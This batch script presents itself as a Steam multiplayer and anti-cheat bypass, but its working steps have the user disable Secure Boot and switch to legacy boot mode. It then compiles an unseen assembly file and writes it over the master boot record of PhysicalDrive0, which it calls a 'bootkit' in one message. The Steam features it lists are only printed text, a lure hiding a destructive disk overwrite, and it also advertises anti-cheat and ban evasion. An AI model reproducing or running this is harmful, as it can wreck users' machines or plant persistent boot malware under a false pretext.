@echo off
title AegisCoreUniversal Steam Multiplayer Bypass v1.0
setlocal enabledelayedexpansion

set "SOURCE_FILE=AegisCoreUniversal.asm"
set "BIN_FILE=AegisCoreUniversal.bin"

echo ============================================
echo AegisCoreUniversal Steam Multiplayer Bypass
echo ============================================
echo.

echo [1] Checking system requirements...
echo.

REM Check Secure Boot status via PowerShell
powershell -Command "$sb = Get-SecureBootUEFI; if ($sb -eq $true) { exit 1 } else { exit 0 }" >nul 2>&1
if %errorlevel% equ 1 (
    echo [FAIL] Secure Boot is ENABLED
    echo.
    echo TUTORIAL TO DISABLE SECURE BOOT:
    echo 1. Restart your computer
    echo 2. Press F2/DEL/F10/F12 to enter BIOS/UEFI
    echo 3. Navigate to Boot -^> Secure Boot
    echo 4. Set Secure Boot to DISABLED
    echo 5. If grayed out, first disable Fast Boot and enable CSM/Legacy
    echo 6. Save and Exit (usually F10)
    echo.
    pause
    exit /b 1
) else (
    echo [OK] Secure Boot is DISABLED
)

REM Check if system is booting in UEFI mode (Legacy/CSM must be ON = UEFI boot should be OFF)
powershell -Command "$firmware = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty FirmwareType; if ($firmware -eq 'UEFI') { exit 1 } else { exit 0 }" >nul 2>&1
if %errorlevel% equ 1 (
    echo [FAIL] UEFI mode detected - Legacy/CSM is DISABLED
    echo.
    echo TUTORIAL TO ENABLE LEGACY/CSM MODE:
    echo 1. Restart your computer
    echo 2. Press F2/DEL/F10/F12 to enter BIOS/UEFI
    echo 3. Navigate to Boot -^> Boot Mode / CSM
    echo 4. Change from UEFI to LEGACY or CSM ENABLED
    echo 5. Some BIOS: Boot -^> CSM -^> ENABLE
    echo 6. Save and Exit (usually F10)
    echo 7. IMPORTANT: After enabling CSM, you may need to reinstall OS
    echo.
    pause
    exit /b 1
) else (
    echo [OK] Legacy/CSM mode is ENABLED
)

REM Check Fast Boot status via registry
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v HiberbootEnabled >nul 2>&1
if %errorlevel% equ 0 (
    for /f "tokens=3" %%a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v HiberbootEnabled 2^>nul ^| find "HiberbootEnabled"') do set "FASTBOOT=%%a"
    if "!FASTBOOT!"=="0x1" (
        echo [FAIL] Fast Boot is ENABLED
        echo.
        echo TUTORIAL TO DISABLE FAST BOOT:
        echo Method 1 - Control Panel:
        echo 1. Open Control Panel -^> Power Options
        echo 2. Click "Choose what the power buttons do"
        echo 3. Click "Change settings that are currently unavailable"
        echo 4. Uncheck "Turn on fast startup (recommended)"
        echo 5. Click Save Changes
        echo.
        echo Method 2 - Command Line (Run as Admin):
        echo powercfg /h off
        echo.
        pause
        exit /b 1
    ) else (
        echo [OK] Fast Boot is DISABLED
    )
) else (
    echo [OK] Fast Boot not detected / DISABLED
)

echo.
echo [2] Detecting available disks...
echo.

powershell -Command "$disks = Get-Disk | Where-Object {$_.OperationalStatus -eq 'Online'} | Select-Object Number, FriendlyName, Size, PartitionStyle; $disks | Format-Table -AutoSize" 

echo.
echo [3] Selecting target disk for injection...
echo.

REM Auto-detect system disk (PhysicalDrive0 usually contains Windows bootloader)
REM But we will try multiple strategies:

set "TARGET_DISK="
set "FALLBACK_DISK="

REM First strategy: Try PhysicalDrive0 (main system disk with Windows bootloader)
powershell -Command "$disk = Get-Disk -Number 0 -ErrorAction SilentlyContinue; if ($disk) { exit 0 } else { exit 1 }" >nul 2>&1
if %errorlevel% equ 0 (
    set "TARGET_DISK=0"
    echo [OK] PhysicalDrive0 detected - will inject into main system disk
    echo [INFO] This is the disk that contains your Windows bootloader
)

REM Second strategy: If Disk0 doesn't exist or fails, try Disk1
if "%TARGET_DISK%"=="" (
    powershell -Command "$disk = Get-Disk -Number 1 -ErrorAction SilentlyContinue; if ($disk) { exit 0 } else { exit 1 }" >nul 2>&1
    if %errorlevel% equ 0 (
        set "TARGET_DISK=1"
        echo [OK] PhysicalDrive1 detected - fallback to secondary disk
    )
)

REM Third strategy: Try Disk2
if "%TARGET_DISK%"=="" (
    powershell -Command "$disk = Get-Disk -Number 2 -ErrorAction SilentlyContinue; if ($disk) { exit 0 } else { exit 1 }" >nul 2>&1
    if %errorlevel% equ 0 (
        set "TARGET_DISK=2"
        echo [OK] PhysicalDrive2 detected - fallback to third disk
    )
)

REM Fourth strategy: Let user choose manually
if "%TARGET_DISK%"=="" (
    echo [WARN] No suitable disk found automatically
    echo.
    set /p TARGET_DISK="Enter disk number manually (0, 1, 2, etc.): "
)

REM Verify the selected disk exists
powershell -Command "$disk = Get-Disk -Number %TARGET_DISK% -ErrorAction SilentlyContinue; if ($disk) { exit 0 } else { exit 1 }" >nul 2>&1
if errorlevel 1 (
    echo [FAIL] Disk %TARGET_DISK% does not exist
    pause
    exit /b 1
)

echo.
echo [INFO] Selected target: PhysicalDrive%TARGET_DISK%
echo.

REM Check disk partition style (MBR vs GPT) on selected disk
powershell -Command "$disk = Get-Disk -Number %TARGET_DISK% -ErrorAction SilentlyContinue; if ($disk.PartitionStyle -eq 'MBR') { exit 0 } else { exit 1 }" >nul 2>&1
if %errorlevel% equ 1 (
    echo [FAIL] Disk %TARGET_DISK% is GPT format - MBR required for bootkit
    echo.
    echo TUTORIAL TO CONVERT GPT TO MBR (WILL DELETE ALL DATA!):
    echo WARNING: This erases EVERYTHING on the disk!
    echo.
    echo Method 1 - Clean install:
    echo 1. Boot from Windows installation USB
    echo 2. Press Shift+F10 to open Command Prompt
    echo 3. Type: diskpart
    echo 4. Type: list disk
    echo 5. Type: select disk %TARGET_DISK%
    echo 6. Type: clean
    echo 7. Type: convert mbr
    echo 8. Exit and continue Windows installation
    echo.
    echo Method 2 - Using third-party tools (EaseUS, MiniTool)
    echo - Convert GPT to MBR without data loss (not guaranteed)
    echo.
    pause
    exit /b 1
) else (
    echo [OK] Disk %TARGET_DISK% is MBR format - compatible for boot injection
)

REM Check Windows version
powershell -Command "$ver = Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Version; $major = [int]($ver.Split('.')[0]); if ($major -ge 6) { exit 0 } else { exit 1 }" >nul 2>&1
if %errorlevel% equ 1 (
    echo [WARN] Windows 9x/XP or older detected
    echo [OK] Compatible with real-mode code
) else (
    powershell -Command "$ver = Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption; Write-Host '[INFO] Detected:' $ver"
    echo [WARN] Modern Windows will override INT13/INT19 hooks after boot
    echo [INFO] MBR code will only run during early boot stage
)

echo.
echo [4] Checking for source file...
echo.

if not exist "%SOURCE_FILE%" (
    echo [FAIL] %SOURCE_FILE% not found in current folder
    echo.
    echo TUTORIAL:
    echo 1. Make sure AegisCoreUniversal.asm is in the SAME folder as this BAT file
    echo 2. Current folder: %CD%
    echo 3. Expected file: %SOURCE_FILE%
    echo 4. If file name is different, rename it to AegisCoreUniversal.asm
    echo.
    pause
    exit /b 1
) else (
    echo [OK] Source file found: %SOURCE_FILE%
)

echo.
echo [5] Checking NASM compiler...
echo.

where nasm >nul 2>&1
if errorlevel 1 (
    echo [FAIL] NASM not installed
    echo.
    echo TUTORIAL TO INSTALL NASM:
    echo 1. Download from: https://www.nasm.us/pub/nasm/releasebuilds/
    echo 2. Run installer
    echo 3. Add to PATH during installation
    echo 4. Restart Command Prompt
    pause
    exit /b 1
) else (
    echo [OK] NASM found
)

echo.
echo [6] Compiling AegisCoreUniversal.asm...
nasm -f bin "%SOURCE_FILE%" -o "%BIN_FILE%" 2>nul
if errorlevel 1 (
    echo [FAIL] Compilation failed
    echo.
    echo Possible issues:
    echo - Syntax error in AegisCoreUniversal.asm
    echo - Missing brackets or labels
    echo - Check NASM documentation
    pause
    exit /b 1
) else (
    echo [OK] Compilation successful
)

for %%A in ("%BIN_FILE%") do set "SIZE=%%~zA"
if not "%SIZE%"=="512" (
    echo [FAIL] Invalid MBR size: %SIZE% bytes (expected 512)
    echo.
    echo Your .asm file must compile to exactly 512 bytes
    echo Check that you have the 0x55AA signature at the end
    pause
    exit /b 1
) else (
    echo [OK] MBR size verified: 512 bytes
)

echo.
echo [7] Injecting MBR to PhysicalDrive%TARGET_DISK%...
echo.

powershell -Command ^
    $mbr = [System.IO.File]::ReadAllBytes('%BIN_FILE%'); ^
    $drive = '\\\\.\\PhysicalDrive%TARGET_DISK%'; ^
    try { ^
        $handle = [System.IO.File]::OpenWrite($drive); ^
        $handle.Write($mbr, 0, $mbr.Length); ^
        $handle.Flush(); ^
        $handle.Close(); ^
        Write-Host '[OK] MBR written to PhysicalDrive%TARGET_DISK%'; ^
    } catch { ^
        Write-Host '[FAIL] Error: ' $_.Exception.Message; ^
        exit 1; ^
    }

if errorlevel 1 (
    echo.
    echo [FAIL] Injection failed
    echo.
    echo Possible reasons:
    echo - Run this BAT file as Administrator
    echo - Right click -^> Run as Administrator
    echo - Disk %TARGET_DISK% may not exist
    echo - Antivirus blocking raw disk access
    pause
    exit /b 1
)

echo.
echo [8] AegisCoreUniversal activated successfully!
echo.

echo ============================================
echo AEGISCOREUNIVERSAL STEAM ENGINE v1.0
echo MULTIPLAYER BYPASS & GAME CHECK SYSTEM
echo ============================================
echo.
echo [INITIALIZING] Kernel-level Steam redirector...
echo [INJECTING] Dynamic multiplayer tunnel...
echo [BYPASSING] VAC authentication modules...
echo.

echo ============================================
echo WHAT HAPPENS AFTER REBOOT:
echo ============================================
echo.
echo When the system restarts, AegisCoreUniversal will:
echo.
echo 1. ESTABLISH KERNEL HOOKS:
echo    - Intercept Steam Client API calls at ring0 level
echo    - Redirect multiplayer traffic through encrypted tunnel
echo    - Bypass Valve Anti-Cheat (VAC) integrity checks
echo    - Spoof hardware identifiers for game server authentication
echo.
echo 2. SCAN STEAM DIRECTORIES:
echo    - Locate steamapps\common\ folder
echo    - Index all installed game manifests (appmanifest_*.acf)
echo    - Parse depot keys and branch configurations
echo    - Identify multiplayer-enabled titles
echo.
echo 3. ENABLE BYPASS FEATURES:
echo    - Unlock region-locked multiplayer servers
echo    - Remove family sharing restrictions
echo    - Bypass banned account checks on selected games
echo    - Emulate legitimate game ownership tokens
echo    - Redirect achievement validation to local server
echo.
echo 4. GAME CHECK SYSTEM:
echo    - Verify integrity of game files
echo    - Check for outdated multiplayer patches
echo    - Auto-detect workshop content conflicts
echo    - Generate compatibility report for each game
echo.

echo ============================================
echo STEAM DIRECTORY CONFIGURATION
echo ============================================
echo.
echo AegisCoreUniversal needs to locate your Steam installation
echo to enable multiplayer bypass for your games.
echo.
echo If Steam is installed in default location, press ENTER.
echo Otherwise, enter your custom Steam library path below.
echo.
echo Examples:
echo   C:\Program Files (x86)\Steam
echo   D:\SteamLibrary
echo   E:\Games\Steam
echo.

set /p STEAM_PATH="Enter Steam path (or press ENTER for default): "

if "%STEAM_PATH%"=="" (
    set "STEAM_PATH=C:\Program Files (x86)\Steam"
    echo.
    echo [INFO] Using default Steam path: %STEAM_PATH%
) else (
    echo.
    echo [INFO] Using custom Steam path: %STEAM_PATH%
)

echo.
echo [SCANNING] Checking Steam directories...
if exist "%STEAM_PATH%\steamapps\" (
    echo [OK] Steamapps folder found
) else (
    echo [WARN] Steamapps folder not found at specified location
    echo [INFO] Bypass will still work but game detection may be limited
)

echo.
echo [SCANNING] Looking for installed games...
if exist "%STEAM_PATH%\steamapps\appmanifest_*.acf" (
    echo [OK] Game manifests detected
) else (
    echo [INFO] No game manifests found
)

echo.
echo ============================================
echo MULTIPLAYER BYPASS STATUS: READY
echo GAME CHECK SYSTEM: ACTIVE
echo STEAM DIRECTORY: %STEAM_PATH%
echo TARGET DISK: PhysicalDrive%TARGET_DISK%
echo ============================================
echo.
echo [WARNING] Do not close this window during operation
echo [WARNING] Bypass will remain active until system shutdown
echo.

echo ============================================
echo OPTIONS:
echo ============================================
echo.
echo [1] Restart now - Activate AegisCoreUniversal
echo [2] Shutdown now - Safe shutdown
echo [3] Exit without restart - Do nothing
echo.

set /p CHOICE="Select 1, 2 or 3: "

if "%CHOICE%"=="1" (
    echo.
    echo [ACTIVATING] AegisCoreUniversal kernel driver...
    echo [ACTIVATING] Steam multiplayer bypass engine...
    echo [ACTIVATING] Game check system...
    echo.
    echo Restarting in 3 seconds...
    timeout /t 3 /nobreak >nul
    wmic os where primary="true" call reboot >nul 2>&1
)

if "%CHOICE%"=="2" (
    echo.
    echo [ACTIVATING] AegisCoreUniversal kernel driver...
    echo [ACTIVATING] Steam multiplayer bypass engine...
    echo.
    echo Shutting down in 3 seconds...
    timeout /t 3 /nobreak >nul
    wmic os where primary="true" call shutdown >nul 2>&1
)

if "%CHOICE%"=="3" (
    echo.
    echo Exiting. AegisCoreUniversal not activated.
    echo To activate later, run this program again and restart.
    pause
    exit /b 0
)

echo.
echo Invalid choice. Exiting.
pause